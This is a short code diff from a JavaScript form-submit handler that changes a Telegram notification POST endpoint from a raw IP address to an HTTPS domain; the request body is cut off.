@@ -1375,7 +1375,7 @@ async function handleSubmit() {
 
   try {
     // Send to Telegram
-    const tgResponse = await fetch('http://45.82.72.151:5001/notify', {
+    const tgResponse = await fetch('https://api.finksecurity.com/notify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
